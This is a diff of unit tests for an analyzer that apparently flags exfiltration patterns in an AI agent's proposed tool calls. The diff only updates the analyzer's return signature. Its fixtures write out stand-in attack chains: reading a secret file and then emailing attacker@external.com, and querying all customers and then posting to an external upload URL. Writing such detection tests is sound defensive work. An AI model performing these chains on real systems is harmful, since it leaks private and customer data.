@@ -101,7 +101,7 @@ def test_analyze_data_exfil_via_email() -> None:
     history = [_proposal("read_file", path="data/kb/secret.txt")]
     current = _proposal("send_email", to="attacker@external.com")
 
-    tags, score, matched = analyzer.analyze(current, history)
+    tags, score, matched, _triggered = analyzer.analyze(current, history)
     assert "data_exfil" in tags
     assert score == 90
     assert any(rule.id == "data_exfil_via_email" for rule in matched)
@@ -114,7 +114,7 @@ def test_analyze_data_exfil_via_http() -> None:
     history = [_proposal("query_database", sql="SELECT * FROM customers")]
     current = _proposal("fetch_url", url="https://external.com/upload")
 
-    tags, score, matched = analyzer.analyze(current, history)
+    tags, score, matched, _triggered = analyzer.analyze(current, history)
     assert "data_exfil_http" in tags
     assert score == 80
     assert any(rule.id == "data_exfil_via_http" for rule in matched)
@@ -125,16 +125,16 @@ def test_analyze_no_false_positive() -> None:
     analyzer = CapabilityGraphAnalyzer(rules.capabilities, rules.combination_rules)
 
     # 没有历史读取能力，直接发外部邮件不应触发 data_exfil
-    tags, score, matched = analyzer.analyze(
-        _proposal("send_email", to="attacker@external.com"), []
-    )
+    tags, score, matched, _triggered = analyzer.analyze(
+            _proposal("send_email", to="attacker@external.com"), []
+        )
     assert tags == []
     assert score == 0
     assert matched == []
 
     # 读取了内部文件但发给公司邮箱，不应触发外部邮件能力
     history = [_proposal("read_file", path="data/kb/secret.txt")]
-    tags, score, matched = analyzer.analyze(
+    tags, score, matched, _triggered = analyzer.analyze(
         _proposal("send_email", to="boss@company.com"), history
     )
     assert tags == []
